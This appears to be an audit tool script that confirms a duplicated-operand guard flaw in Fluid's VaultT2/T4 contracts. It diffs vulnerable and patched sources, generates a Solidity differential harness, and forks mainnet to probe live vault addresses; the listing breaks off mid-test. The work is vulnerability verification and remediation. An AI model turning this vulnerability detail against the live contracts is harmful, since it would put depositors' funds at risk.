#!/usr/bin/env node
"use strict";

// fluid-t2negmax-differential-r1.js
// Lane 2/3: Fluid VaultT2/T4 negative-max predicate differential fork test.
//
// Scope (read-only + fork-local impersonated txs only):
//   a  predicate differential: read the exact duplicated-operand predicate at
//      vaultT2/coreModule/mainOperate.sol:51 and vaultT4/coreModule/mainOperate.sol:88
//      from targets/fluid-contracts-public (live-equivalent vulnerable),
//      remediations/fluid-vaultt2-t4-r2-vulnerable (vulnerable copy) and
//      remediations/fluid-vaultt2-t4-r2 (patched). Record the transpiled expression diff.
//   b  forge differential: a minimal pure-Solidity unit reproduction of the math around the
//      duplicated operand, with the two guard expressions extracted verbatim from each tree's
//      source (auto-generated harness, provenance recorded), fuzzed + boundary-enumerated.
//      Corroboration: the pre-existing audit harnesses inside each tree are run under forge so
//      the divergence is also observed against each tree's own compiled contracts.
//   c  live-fork check: fork chain 1 at a fresh finalized pin, take one near/at-LT negative-max
//      T2 row and one healthy T2 row from the freshest scan output, and call the real vault
//      `liquidate` entry on the LIVE vault addresses through anvil (healthy row must fail closed).
//   d  bounded fork-level exploit simulation against a fresh plain-transfer near/at-LT substitute
//      row (impersonation-local only): fund an EOA via mapping-key storage writes, approve, and
//      drive the real `operatePerfect` entry with a negative token1 maximum. A token-level baseline
//      revert (FluidSafeTransferError 0xdee51a8a) is FAIL_CLOSED_DATA_DEPENDENT_TOKEN_REJECTION; a
//      passing baseline with no unowned net-positive seize is FAIL_CLOSED_CALLER_FUNDED_NO_NET_POSITIVE;
//      only a passing baseline + a measured unowned net-positive seize beyond the honest
//      maxLiquidationPenalty would be a finding.
//
// Discipline:
//   * every numeric row carries its pin block + hash
//   * unit-scale guards fire INCONCLUSIVE_UNIT_SCALE_MISMATCH instead of a raw number
//   * no signing, no real-key reads; anvil txs only from impersonated/funded EOAs on the fork
//   * nothing is ever forwarded upstream
//   * honest verdict vocabulary: PASS* / FAIL_CLOSED / INCONCLUSIVE_<reason> / INSUFFICIENT_EVIDENCE
//
// Endpoint material (URL / host / path) is NEVER printed, persisted, or logged.
// Anvil forks through an in-process loopback relay that owns the upstream, mirroring
// tools/twyne-wrapper-accounting-step2.js, tools/aave-v3-flash-liquidator-rehearsal.js and
// tools/liquity-fork-rehearsal.js. The only endpoint watermark emitted anywhere is the
// path-only inventory name.

const fs = require("node:fs");
const path = require("node:path");
const os = require("node:os");
const http = require("node:http");
const net = require("node:net");
const crypto = require("node:crypto");
const { spawn, spawnSync } = require("node:child_process");
const { Interface, AbiCoder, keccak256 } = require(path.join(__dirname, "node_modules", "ethers"));

const ROOT = path.resolve(__dirname, "..");
const OUTDIR = path.join(ROOT, "reports", "raw", "fast");
const OUTPUT = path.join(OUTDIR, "fluid-t2negmax-differential-r1.json");
const REPORT = path.join(ROOT, "reports", "fluid-t2negmax-differential-r1.md");
const INVENTORY = path.join(ROOT, "rpc_endpoints.txt");
const SCAN_JSON = path.join(OUTDIR, "fluid-l.json");
const ECONOMICS_JSON = path.join(OUTDIR, "fluid-l-economics.json");
const ANVIL = "C:\\Users\\MiPC\\.foundry\\bin\\anvil.exe";
const FORGE = "C:\\Users\\MiPC\\.foundry\\bin\\forge.exe";
const SCRATCH = path.join(os.tmpdir(), "fluid-t2negmax-differential-r1");
const TREE_HARNESS_LOG_VULN = path.join(OUTDIR, "_tmp_vuln_focused.log");
const TREE_HARNESS_LOG_PATCHED = path.join(OUTDIR, "_tmp_patched_focused.log");

const CHAIN_ID_DEFAULT = 1;
const ONE = 10n ** 18n;
const SAFE_MAX = (1n << 127n) - 1n; // int128-style positive ceiling used by the in-tree harnesses
const UNIT_SCALE_TARGET = 10n ** 14n;
const EIP1967_IMPL_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
const FACTORY_CHAIN1 = "0x324c5dc1fc42c7a4d43d92df1eba58a54d13bf2d";

const LIMIT_MS = 1500000; // 25 min hard deadline
const MAX_INVENTORY = 24;
const TREE_HARNESS_TIMEOUT_MS = 360000;

const TREES = [
  { key: "target", path: "targets/fluid-contracts-public", label: "targets/fluid-contracts-public (live-equivalent, vulnerable)" },
  { key: "remediation_vulnerable", path: "remediations/fluid-vaultt2-t4-r2-vulnerable", label: "remediations/fluid-vaultt2-t4-r2-vulnerable (vulnerable copy)" },
  { key: "remediation_patched", path: "remediations/fluid-vaultt2-t4-r2", label: "remediations/fluid-vaultt2-t4-r2 (patched)" },
];
const PREDICATE_FILES = {
  T2: { rel: "contracts/protocols/vault/vaultT2/coreModule/mainOperate.sol", line: 51 },
  T4: { rel: "contracts/protocols/vault/vaultT4/coreModule/mainOperate.sol", line: 88 },
};
const TIER_HARNESS = {
  vulnerable: {
    key: "target",
    dir: "remediations/fluid-vaultt2-t4-r2-vulnerable",
    contract: "FluidVaultT2T4NegativeMaxVulnerableR2Test",
    test: "test_vulnerableT2T4Token1NegativeAcceptanceBothErc20Orderings",
    extraTest: "test_reserveShiftOriginalPositiveMaxRevertsButNegativeAcceptsT2AndT4",
  },
  patched: {
    key: "remediation_patched",
    dir: "remediations/fluid-vaultt2-t4-r2",
    contract: "FluidVaultT2T4NegativeMaxRemediationR2UnitTest",
    test: "test_patchedDepositToken1BoundariesBothTypesAndErc20Orderings",
    extraTest: "test_patchedReserveShiftRejectsOriginalMaxAndNegativeThenExactPostQuoteSucceeds",
  },
};

const fail = (code) => { const e = new Error(code); e.code = code; throw e; };
const quantity = (value) => "0x" + BigInt(value).toString(16);
const word = (value) => `0x${BigInt(value).toString(16).padStart(64, "0")}`;
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const num = (v) => Number(BigInt(v));
const sha256 = (buf) => crypto.createHash("sha256").update(buf).digest("hex");
const deadline = () => Date.now() + LIMIT_MS;

const EOA = "0x" + keccak256(Buffer.from("fluid-t2negmax-differential-r1-eoa", "utf8")).slice(26);
const EOA_SHIFT = "0x" + keccak256(Buffer.from("fluid-t2negmax-differential-r1-shift", "utf8")).slice(26);
let HARD_DEADLINE = Date.now() + LIMIT_MS;

let anvil = null;
let requestId = 0;
let aborted = false;
let stage = "SETUP";
let preferred = null;
const failedBackings = new Set();

const IFACE = {
  vault: new Interface([
    "function liquidate(uint256 debtAmt_, uint256 colPerUnitDebt_, uint256 token0ColAmtPerUnitShares_, uint256 token1ColAmtPerUnitShares_, address to_, bool absorb_) payable returns (uint256 actualDebt_, uint256 actualColShares_, uint256 token0Col_, uint256 token1Col_)",
    "function operate(uint256 nftId_, int256 newColToken0_, int256 newColToken1_, int256 colSharesMinMax_, int256 newDebt_, address to_) payable returns (uint256, int256, int256)",
    "function operatePerfect(uint256 nftId_, int256 perfectColShares_, int256 colToken0MinMax_, int256 colToken1MinMax_, int256 newDebt_, address to_) payable returns (uint256, int256[])",
    "function getVaultVariables() view returns (address, address, address, address, uint256)",
  ]),
  factory: new Interface(["function isVaultDeploymentLogic(address vaultDeploymentLogic_) view returns (bool)"]),
  erc20: new Interface([
    "function balanceOf(address) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function allowance(address,address) view returns (uint256)",
    "function approve(address spender, uint256 value) returns (bool)",
    "function transfer(address to, uint256 value) returns (bool)",
  ]),
  errors: new Interface([
    "error FluidVaultError(uint256 errorId_)",
    "error FluidDexError(uint256 errorId_)",
    "error FluidLiquidateResult(uint256 colLiquidated, uint256 debtLiquidated)",
    "error FluidSafeTransferError(uint256 errorId_)",
    "error FluidLiquidityError(uint256 errorId_)",
    "error FluidOracleError(uint256 errorId_)",
    "error FluidLiquidityCalcsError(uint256 errorId_)",
    "error FluidConfigError(uint256 errorId_)",
  ]),
};

const VAULT_ERR = {
  31004: "Vault__NotAnOwner", 31006: "Vault__PositionAboveCF", 31009: "Vault__ExcessSlippageLiquidation",
  31015: "Vault__ExcessDebtPayback", 31022: "Vault__InvalidLiquidationAmt", 31023: "Vault__UserCollateralDebtExceed",
  31029: "Vault__InvalidLiquidation", 31032: "Vault__LiquidationReverts", 31033: "Vault__InvalidOraclePrice",
  31035: "Vault__FetchLatestPositionFailed", 35001: "VaultDex__InvalidOperateAmount",
  35002: "VaultDex__DebtSharesPaidMoreThanAvailableLiquidation",
};
const DEX_ERR = { 51015: "DexT1__AboveDepositMax", 51005: "DexT1__BelowWithdrawMin", 51010: "DexT1__BelowBorrowMin", 51011: "DexT1__AbovePaybackMax" };
// SafeTransfer error ids (contracts/libraries/errorTypes.sol: SafeTransfer__TransferFromFailed=71001,
// SafeTransfer__TransferFailed=71002). FluidSafeTransferError is raised by SafeTransfer.safeTransfer(From)
// / safeTransferNative; a token-level revert (no/zero return, reverting transfer) surfaces as this
// selector, which is the 0xdee51a8a data-dependence signature seen on an honest baseline quote.
const SAFE_TRANSFER_ERR = { 71001: "SafeTransfer__TransferFromFailed", 71002: "SafeTransfer__TransferFailed" };
// Recognized Fluid custom-error selectors (decode table). 0xdee51a8a is the
// FluidSafeTransferError(uint256) selector observed on the live-row honest quote by the
// sibling lane; recorded here so a re-run decodes it by name (and reason) instead of unknown-selector.
const SELECTOR_ERRORS = {
  "0x60121cca": { name: "FluidVaultError", signature: "FluidVaultError(uint256)", ids: VAULT_ERR },
  "0x2fee3e0e": { name: "FluidDexError", signature: "FluidDexError(uint256)", ids: DEX_ERR },
  "0xcc36aa44": { name: "FluidLiquidateResult", signature: "FluidLiquidateResult(uint256,uint256)" },
  "0xdee51a8a": { name: "FluidSafeTransferError", signature: "FluidSafeTransferError(uint256)", ids: SAFE_TRANSFER_ERR },
  "0xdcab82e2": { name: "FluidLiquidityError", signature: "FluidLiquidityError(uint256)" },
  "0xc82fc465": { name: "FluidOracleError", signature: "FluidOracleError(uint256)" },
  "0xd50d7512": { name: "FluidLiquidityCalcsError", signature: "FluidLiquidityCalcsError(uint256)" },
  "0xd002e25a": { name: "FluidConfigError", signature: "FluidConfigError(uint256)" },
};

const CODES = new Set([
  "ANVIL_MISSING", "FORGE_MISSING", "ANVIL_CLEANUP_FAILED", "ANVIL_ARGUMENTS_INVALID", "ANVIL_START_FAILED",
  "FORK_BLOCK_MISMATCH", "FORK_BACKING_UNSUPPORTED", "FORK_BACKING_METHOD_MISSING", "FORK_BACKING_STATE_MISSING",
  "FORK_BACKING_BLOCK_FAILURE", "FORK_BACKING_CHAIN_ID_FAILURE", "FORK_BACKING_GAS_PRICE_FAILURE",
  "FORK_BACKING_TRANSACTION_FAILURE", "FORK_BACKING_PROOF_FAILURE", "FORK_BACKING_CODE_FAILURE",
  "FORK_BACKING_BALANCE_FAILURE", "FORK_BACKING_RATE_LIMITED",
  "INVENTORY_MISSING", "NO_ARCHIVE_BACKING", "DEADLINE_EXCEEDED", "SCAN_ARTIFACT_MISSING", "NO_ELIGIBLE_ROWS",
  "RPC_RESPONSE_TOO_LARGE", "UPSTREAM_UNAVAILABLE", "UPSTREAM_RPC_ERROR", "LOCAL_RPC_UNAVAILABLE", "LOCAL_RPC_ERROR",
]);

function budget(maxMs = 8500) {
  if (aborted || Date.now() >= HARD_DEADLINE) fail("DEADLINE_EXCEEDED");
  return Math.max(1, Math.min(maxMs, HARD_DEADLINE - Date.now()));
}

function parseInventory() {
  if (!fs.existsSync(INVENTORY)) return [];
  const rows = [];
  let family = null;
  for (const line of fs.readFileSync(INVENTORY, "utf8").split(/\r?\n/)) {
    const heading = line.match(/^\s*(?:#{1,6}\s+)?(?:-{3}\s+)?(?:provider|family|service)\s*[:=\-]\s*(.+?)\s*(?:-{3})?\s*$/i);
    if (heading) family = heading[1];
    const match = line.match(/https?:\/\/[^\s'"<>\[\]]+/i);
    if (!match) continue;
    let parsed;
    try { parsed = new URL(match[0].replace(/[)\],;]+$/, "")); } catch (_) { continue; }
    if (parsed.protocol !== "https:" || parsed.username || parsed.password || parsed.search || parsed.hash) continue;
    if (parsed.pathname !== "/" && !/^\/(v3|api)?\/?$/.test(parsed.pathname)) continue;
    const metadata = line.replace(match[0], " ");
    if (/\b(?:origin|header|auth|bearer|x-api-key|key|token)\s*[:=]/i.test(metadata)) continue;
    rows.push(parsed.href);
  }
  return [...new Set(rows)].slice(0, MAX_INVENTORY);
}

function candidatePool(chainId) {
  if (chainId !== 1) return [];
  const archive = ["https://eth.blockscout.com/api/eth-rpc", "https://eth.drpc.org"];
  const fallback = ["https://gateway.tenderly.co/public/mainnet", "https://rpc.mevblocker.io", "https://ethereum.publicnode.com"];
  const pool = [
    ...archive.map((url) => ({ url, backingClass: "PUBLIC_KEYLESS_ARCHIVE" })),
    ...fallback.map((url) => ({ url, backingClass: "PUBLIC_KEYLESS_FALLBACK" })),
    ...parseInventory().map((url) => ({ url, backingClass: "PUBLIC_KEYLESS_INVENTORY" })),
  ];
  const seen = new Set();
  const ordered = [];
  for (const c of pool) {
    if (seen.has(c.url)) continue;
    seen.add(c.url);
    ordered.push(c);
  }
  if (preferred && seen.has(preferred)) {
    const idx = ordered.findIndex((c) => c.url === preferred);
    if (idx > 0) ordered.unshift(ordered.splice(idx, 1)[0]);
  }
  return ordered;
}

async function rpc(url, method, params, upstream = false) {
  let response;
  const bodyJson = JSON.stringify({ jsonrpc: "2.0", id: ++requestId, method, params });
  for (let attempt = 0; attempt < 3; attempt += 1) {
    response = await fetch(url, {
      method: "POST", headers: { "content-type": "application/json" }, body: bodyJson,
      signal: AbortSignal.timeout(budget(upstream ? 8500 : 30000)),
    });
    if (response.status !== 429 || attempt === 2) break;
    await response.arrayBuffer();
    await delay(400 * (attempt + 1));
  }
  if (!response.ok || Number(response.headers.get("content-length") || 0) > 8 * 1024 * 1024) fail(upstream ? "UPSTREAM_UNAVAILABLE" : "LOCAL_RPC_UNAVAILABLE");
  const bytes = await response.arrayBuffer();
  if (bytes.byteLength > 8 * 1024 * 1024) fail("RPC_RESPONSE_TOO_LARGE");
  const body = JSON.parse(Buffer.from(bytes).toString("utf8"));
  if (body?.error) {
    const error = new Error(upstream ? "UPSTREAM_RPC_ERROR" : "LOCAL_RPC_ERROR");
    error.reverted = /execution reverted|\brevert\b|VM Exception/i.test(String(body.error.message || ""));
    const data = typeof body.error.data === "string" ? body.error.data : body.error.data?.data;
    if (typeof data === "string" && /^0x[0-9a-f]+$/i.test(data)) error.revertData = data.toLowerCase();
    throw error;
  }
  if (!body || Array.isArray(body) || body.result === undefined) fail(upstream ? "UPSTREAM_RPC_ERROR" : "LOCAL_RPC_ERROR");
  return body.result;
}

async function qualify(url, { chainId, addresses }) {
  if (await rpc(url, "eth_chainId", [], true) !== quantity(chainId)) return null;
  const head = (await rpc(url, "eth_getBlockByNumber", ["finalized", false], true).catch(() => null))
    || (await rpc(url, "eth_getBlockByNumber", ["latest", false], true));
  if (!head || !/^0x[0-9a-f]{64}$/i.test(head.hash || "") || !/^0x[0-9a-f]+$/i.test(head.number || "")) return null;
  const headNumber = num(head.number);
  const pin = headNumber - 1;
  const pinBlock = await rpc(url, "eth_getBlockByNumber", [quantity(pin), false], true);
  if (!pinBlock || num(pinBlock.number) !== pin || !/^0x[0-9a-f]{64}$/i.test(pinBlock.hash || "")) return null;
  for (const addr of addresses) {
    const code = await rpc(url, "eth_getCode", [addr, quantity(pin)], true);
    if (typeof code !== "string" || code.length <= 2) return null;
  }
  return { pin, pinHash: pinBlock.hash, pinTimestamp: num(pinBlock.timestamp), headNumber };
}

function stopAnvil() {
  if (!anvil) return true;
  const child = anvil;
  anvil = null;
  if (child.exitCode !== null || !child.pid) return true;
  if (process.platform === "win32") spawnSync("taskkill", ["/PID", String(child.pid), "/T", "/F"], { stdio: "ignore", windowsHide: true, timeout: 4000 });
  else { try { child.kill("SIGKILL"); } catch (_) {} }
  try { process.kill(child.pid, 0); return false; } catch (_) { return true; }
}

async function startRelay(upstream) {
  const server = http.createServer(async (req, res) => {
    try {
      if (req.method !== "POST" || req.socket.remoteAddress !== "127.0.0.1") fail("RELAY_INVALID_REQUEST");
      let size = 0; const chunks = [];
      for await (const chunk of req) { size += chunk.length; if (size > 1024 * 1024) fail("RELAY_REQUEST_TOO_LARGE"); chunks.push(chunk); }
      const query = JSON.parse(Buffer.concat(chunks).toString("utf8"));
      if (!query || typeof query.method !== "string" || !/^eth_|^net_|^web3_/.test(query.method)) fail("RELAY_INVALID_METHOD");
      let remote;
      for (let attempt = 0; attempt < 3; attempt += 1) {
        remote = await fetch(upstream, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(query), signal: AbortSignal.timeout(budget(25000)) });
        if (remote.status !== 429 || attempt === 2) break;
        await remote.arrayBuffer();
        await delay(400 * (attempt + 1));
      }
      const bytes = await remote.arrayBuffer();
      if (!remote.ok || bytes.byteLength > 16 * 1024 * 1024) fail("RELAY_UPSTREAM_FAILURE");
      res.writeHead(200, { "content-type": "application/json" }); res.end(Buffer.from(bytes));
    } catch (_) {
      if (!res.headersSent) res.writeHead(502, { "content-type": "application/json" });
      res.end(JSON.stringify({ jsonrpc: "2.0", id: null, error: { code: -32000, message: "RELAY_UPSTREAM_FAILURE" } }));
    }
  });
  await new Promise((resolve, reject) => { server.once("error", reject); server.listen(0, "127.0.0.1", resolve); });
  return { url: `http://127.0.0.1:${server.address().port}`, close() { try { server.closeAllConnections(); } catch (_) {} server.close(); } };
}

async function startAnvil(relayUrl, pin) {
  if (!stopAnvil()) fail("ANVIL_CLEANUP_FAILED");
  const listener = net.createServer();
  await new Promise((resolve, reject) => { listener.once("error", reject); listener.listen(0, "127.0.0.1", resolve); });
  const port = listener.address().port;
  await new Promise((resolve) => listener.close(resolve));
  anvil = spawn(ANVIL, ["--host", "127.0.0.1", "--port", String(port), "--fork-url", relayUrl,
    "--fork-block-number", String(pin), "--no-rate-limit", "--block-base-fee-per-gas", "1000000000"],
  { stdio: ["ignore", "ignore", "pipe"], windowsHide: true, shell: false });
  let bootDiagnostic = "";
  anvil.stderr.on("data", (chunk) => { bootDiagnostic = (bootDiagnostic + chunk.toString("utf8")).slice(-16384); });
  const bootError = () => {
    if (/429|too many requests|rate.limit/i.test(bootDiagnostic)) return "FORK_BACKING_RATE_LIMITED";
    if (/method not found/i.test(bootDiagnostic)) return "FORK_BACKING_METHOD_MISSING";
    if (/missing trie node|historical state/i.test(bootDiagnostic)) return "FORK_BACKING_STATE_MISSING";
    if (/failed to get.*(?:chain.?id|chain id)/i.test(bootDiagnostic)) return "FORK_BACKING_CHAIN_ID_FAILURE";
    if (/failed to get.*(?:gas price|gasprice)/i.test(bootDiagnostic)) return "FORK_BACKING_GAS_PRICE_FAILURE";
    if (/failed to get.*(?:transaction|receipt)/i.test(bootDiagnostic)) return "FORK_BACKING_TRANSACTION_FAILURE";
    if (/failed to get.*proof/i.test(bootDiagnostic)) return "FORK_BACKING_PROOF_FAILURE";
    if (/failed to get.*code/i.test(bootDiagnostic)) return "FORK_BACKING_CODE_FAILURE";
    if (/failed to get.*balance/i.test(bootDiagnostic)) return "FORK_BACKING_BALANCE_FAILURE";
    if (/failed to get block/i.test(bootDiagnostic)) return "FORK_BACKING_BLOCK_FAILURE";
    if (/failed to get|failed to fetch|cannot fork|unsupported/i.test(bootDiagnostic)) return "FORK_BACKING_UNSUPPORTED";
    if (/unexpected argument|unrecognized option|invalid value/i.test(bootDiagnostic)) return "ANVIL_ARGUMENTS_INVALID";
    return "ANVIL_START_FAILED";
  };
  anvil.on("error", () => { /* observed by readiness loop */ });
  for (let attempt = 0; attempt < 80; attempt += 1) {
    budget();
    if (anvil.exitCode !== null) fail(bootError());
    const local = `http://127.0.0.1:${port}`;
    try { if (await rpc(local, "eth_chainId", []) === quantity(CHAIN_ID_DEFAULT) && num(await rpc(local, "eth_blockNumber", [])) === pin) return local; } catch (_) { /* boot in progress */ }
    await delay(120);
  }
  fail(bootError());
}

async function forkSession(chainId, addresses, name, fn) {
  const pool = candidatePool(chainId);
  if (pool.length === 0) fail("NO_ARCHIVE_BACKING");
  let lastErr = "NO_ARCHIVE_BACKING";
  for (const cand of pool) {
    if (failedBackings.has(cand.url)) continue;
    budget(20000);
    let backing;
    try { backing = await qualify(cand.url, { chainId, addresses }); } catch (_) { failedBackings.add(cand.url); continue; }
    if (!backing) { failedBackings.add(cand.url); continue; }
    let relay = null;
    try {
      relay = await startRelay(cand.url);
      const local = await startAnvil(relay.url, backing.pin);
      const out = await fn(local, backing);
      preferred = cand.url;
      out.fork = { pin: backing.pin, pinHash: backing.pinHash, pinTimestamp: backing.pinTimestamp, headBlock: backing.headNumber, backingClass: cand.backingClass, freshFork: true };
      return out;
    } catch (e) {
      lastErr = e?.code && CODES.has(e.code) ? e.code : (e?.message || "FORK_STAGE_FAILURE");
      if (process.env.FLUID_T2NEGMAX_DEBUG === "1") process.stderr.write(`[debug] fork ${name} backing failed: ${lastErr}\n`);
      if (lastErr === "DEADLINE_EXCEEDED") throw e;
      failedBackings.add(cand.url);
    } finally {
      stopAnvil();
      if (relay) relay.close();
    }
  }
  const err = new Error(lastErr); err.code = lastErr; throw err;
}

// ---------------------------------------------------------------------------
// call helpers
// ---------------------------------------------------------------------------
async function tryCall(url, to, data, block) {
  try {
    const result = await rpc(url, "eth_call", [{ to, data }, block]);
    return { ok: true, result };
  } catch (e) {
    return { ok: false, reverted: e.reverted === true, revertData: e.revertData || null };
  }
}

async function tryCallFrom(url, from, to, data, block) {
  try {
    const result = await rpc(url, "eth_call", [{ from, to, data }, block]);
    return { ok: true, result };
  } catch (e) {
    return { ok: false, reverted: e.reverted === true, revertData: e.revertData || null };
  }
}

function decodeRevert(data) {
  if (!data) return { kind: "unknown", selector: null, message: "reverted-without-data" };
  const sel = data.slice(0, 10).toLowerCase();
  if (sel === "0x08c379a0") {
    try { const [m] = AbiCoder.defaultAbiCoder().decode(["string"], "0x" + data.slice(10)); return { kind: "Error(string)", selector: sel, message: String(m) }; } catch (_) { /* fallthrough */ }
  }
  if (sel === "0x4e487b71") {
    try { const [c] = AbiCoder.defaultAbiCoder().decode(["uint256"], "0x" + data.slice(10)); return { kind: "Panic(uint256)", selector: sel, message: "Panic(0x" + c.toString(16) + ")" }; } catch (_) { /* fallthrough */ }
  }
  const known = SELECTOR_ERRORS[sel];
  try {
    const e = IFACE.errors.parseError(data);
    if (e) {
      const name = known ? known.name : e.name;
      const signature = known ? known.signature : `${e.name}(...)`;
      if (name === "FluidLiquidateResult") {
        return { kind: "custom-error", selector: sel, name, signature, colLiquidated: String(e.args[0]), debtLiquidated: String(e.args[1]) };
      }
      const id = e.args && e.args.length ? String(e.args[0]) : null;
      const table = (known && known.ids) ? known.ids : (name === "FluidVaultError" ? VAULT_ERR : name === "FluidDexError" ? DEX_ERR : null);
      return { kind: "custom-error", selector: sel, name, signature, errorId: id, errorName: (id && table) ? (table[id] || "unknown-id") : null };
    }
  } catch (_) { /* fallthrough */ }
  if (known) return { kind: "custom-error", selector: sel, name: known.name, signature: known.signature, errorId: null, errorName: null };
  return { kind: "unknown-selector", selector: sel, message: "unrecognized-selector" };
}

async function sendTx(local, tx) {
  const hash = await rpc(local, "eth_sendTransaction", [tx]);
  let receipt = null;
  for (let n = 0; n < 60 && !receipt; n += 1) { receipt = await rpc(local, "eth_getTransactionReceipt", [hash]); if (!receipt) await delay(120); }
  return { hash, receipt };
}

async function readUint(local, addr, fn, args = [], iface = IFACE.erc20) {
  const r = await tryCall(local, addr, iface.encodeFunctionData(fn, args), "latest");
  if (!r.ok) return null;
  try { return BigInt(iface.decodeFunctionResult(fn, r.result)[0]); } catch (_) { return null; }
}

// ---------------------------------------------------------------------------
// stage a  predicate differential
// ---------------------------------------------------------------------------
function parsePredicateLine(lineText) {
  const m = lineText.match(/\((\w+)\s*<=\s*0\)\s*\|\|\s*\((\w+)\s*<=\s*0\)/);
  if (!m) return null;
  return { operand0: m[1], operand1: m[2] };
}

function stagePredicateDiff() {
  const trees = {};
  const divergences = [];
  for (const tree of TREES) {
    const entry = { key: tree.key, path: tree.path, label: tree.label, types: {} };
    for (const [type, spec] of Object.entries(PREDICATE_FILES)) {
      const abs = path.join(ROOT, tree.path, spec.rel);
      const rec = { type, file: `${tree.path}/${spec.rel}`, line: spec.line, readOk: false };
      if (!fs.existsSync(abs)) { rec.error = "FILE_MISSING"; entry.types[type] = rec; continue; }
      const bytes = fs.readFileSync(abs);
      rec.fileSha256 = sha256(bytes);
      const lines = bytes.toString("utf8").split(/\r?\n/);
      const lineText = (lines[spec.line - 1] || "").trim();
      rec.lineText = lineText;
      const parsed = parsePredicateLine(lineText);
      if (!parsed) { rec.error = "PREDICATE_NOT_MATCHED"; entry.types[type] = rec; continue; }
      rec.readOk = true;
      rec.operand0 = parsed.operand0;
      rec.operand1 = parsed.operand1;
      rec.predicateExpr = `(${parsed.operand0} <= 0) || (${parsed.operand1} <= 0)`;
      rec.classification = parsed.operand1 === "colToken1MinMax_" ? "PATCHED" : "VULNERABLE";
      rec.auxiliaryHole = parsed.operand0 === parsed.operand1;
      entry.types[type] = rec;
    }
    const t2 = entry.types.T2, t4 = entry.types.T4;
    entry.classification = (t2 && t2.classification === "PATCHED" && t4 && t4.classification === "PATCHED") ? "PATCHED"
      : (t2 && t2.classification === "VULNERABLE" && t4 && t4.classification === "VULNERABLE") ? "VULNERABLE" : "MIXED_OR_UNKNOWN";
    trees[tree.key] = entry;
  }

  for (const type of ["T2", "T4"]) {
    const vulnerable = trees.target.types[type];
    const patched = trees.remediation_patched.types[type];
    if (!vulnerable || !patched || !vulnerable.readOk || !patched.readOk) continue;
    const divergent = vulnerable.predicateExpr !== patched.predicateExpr;
    divergences.push({
      type,
      targetFileLine: `${vulnerable.file}:${vulnerable.line}`,
      patchedFileLine: `${patched.file}:${patched.line}`,
      vulnerableExpr: vulnerable.predicateExpr,
      patchedExpr: patched.predicateExpr,
      divergent,
      duplicatedOperand: vulnerable.operand1,
      intendedOperand: "colToken1MinMax_",
      effect: divergent
        ? `the second operand is '${vulnerable.operand0}' in the target and '${patched.operand1}' in the patched tree; a token1 maximum <= 0 is not rejected in the target before the uint cast`
        : "no predicate difference",
    });
  }
  const anyDivergent = divergences.some((d) => d.divergent);
  return {
    verdict: anyDivergent ? "PASS_DIVERGENCE_CONFIRMED" : "PASS_PREDICATE_EQUIVALENT",
    predicateFileLines: { T2: `${PREDICATE_FILES.T2.rel}:${PREDICATE_FILES.T2.line}`, T4: `${PREDICATE_FILES.T4.rel}:${PREDICATE_FILES.T4.line}` },
    trees,
    divergences,
    remediationConsistency: {
      targetEqualsRemediationVulnerable:
        trees.target.types.T2?.predicateExpr === trees.remediation_vulnerable.types.T2?.predicateExpr
        && trees.target.types.T4?.predicateExpr === trees.remediation_vulnerable.types.T4?.predicateExpr,
      patchedDiffers: anyDivergent,
    },
  };
}

// ---------------------------------------------------------------------------
// stage b  forge differential (derived minimal unit reproduction + tree corroboration)
// ---------------------------------------------------------------------------
function buildDifferentialHarness(pred) {
  const t2 = pred.trees.target.types.T2;
  const t4 = pred.trees.target.types.T4;
  const p2 = pred.trees.remediation_patched.types.T2;
  const p4 = pred.trees.remediation_patched.types.T4;
  const vulnExpr2 = `(${t2.operand0} <= 0) || (${t2.operand1} <= 0)`;
  const vulnExpr4 = `(${t4.operand0} <= 0) || (${t4.operand1} <= 0)`;
  const patchedExpr2 = `(${p2.operand0} <= 0) || (${p2.operand1} <= 0)`;
  const patchedExpr4 = `(${p4.operand0} <= 0) || (${p4.operand1} <= 0)`;
  return `// SPDX-License-Identifier: MIT
pragma solidity =0.8.21;

// AUTO-GENERATED by tools/fluid-t2negmax-differential-r1.js.
// Guard expressions below are extracted verbatim (operands preserved) from the pinned tree sources:
//   VULNERABLE T2  ${t2.file}:${t2.line}  sha256=${t2.fileSha256}
//   VULNERABLE T4  ${t4.file}:${t4.line}  sha256=${t4.fileSha256}
//   PATCHED    T2  ${p2.file}:${p2.line}  sha256=${p2.fileSha256}
//   PATCHED    T4  ${p4.file}:${p4.line}  sha256=${p4.fileSha256}
// acceptsX == the guard did NOT revert (predicate false).
contract FluidNegativeMaxPredicate {
    function acceptsVulnerableT2(int256 colToken0MinMax_, int256 colToken1MinMax_) public pure returns (bool) {
        if (${vulnExpr2}) { return false; }
        return true;
    }
    function acceptsVulnerableT4(int256 colToken0MinMax_, int256 colToken1MinMax_) public pure returns (bool) {
        if (${vulnExpr4}) { return false; }
        return true;
    }
    function acceptsPatchedT2(int256 colToken0MinMax_, int256 colToken1MinMax_) public pure returns (bool) {
        if (${patchedExpr2}) { return false; }
        return true;
    }
    function acceptsPatchedT4(int256 colToken0MinMax_, int256 colToken1MinMax_) public pure returns (bool) {
        if (${patchedExpr4}) { return false; }
        return true;
    }
    function castToken1(int256 colToken1MinMax_) public pure returns (uint256) { return uint256(colToken1MinMax_); }
}
`;
}

function buildDifferentialTest() {
  return `// SPDX-License-Identifier: MIT
pragma solidity =0.8.21;

import {Test} from "forge-std/Test.sol";
import {FluidNegativeMaxPredicate} from "../src/FluidNegativeMaxPredicate.sol";

contract DifferentialTest is Test {
    FluidNegativeMaxPredicate internal p = new FluidNegativeMaxPredicate();

    function _divergent(int256 a, int256 b) internal view returns (bool) {
        return p.acceptsVulnerableT2(a, b) != p.acceptsPatchedT2(a, b) || p.acceptsVulnerableT4(a, b) != p.acceptsPatchedT4(a, b);
    }

    function test_boundaryMatrix() public {
        int256[11] memory xs = [
            type(int256).min, -int256(10 ** 30), -1000000, -2, -1, 0, 1, 2, 1000000, int256(10 ** 30), type(int256).max
        ];
        uint256 divergentPairs;
        int256 firstA; int256 firstB;
        for (uint256 i; i < 11; ++i) {
            for (uint256 j; j < 11; ++j) {
                if (_divergent(xs[i], xs[j])) {
                    ++divergentPairs;
                    if (divergentPairs == 1) { firstA = xs[i]; firstB = xs[j]; }
                }
            }
        }
        emit log_named_uint("DIVERGENT_PAIR_COUNT", divergentPairs);
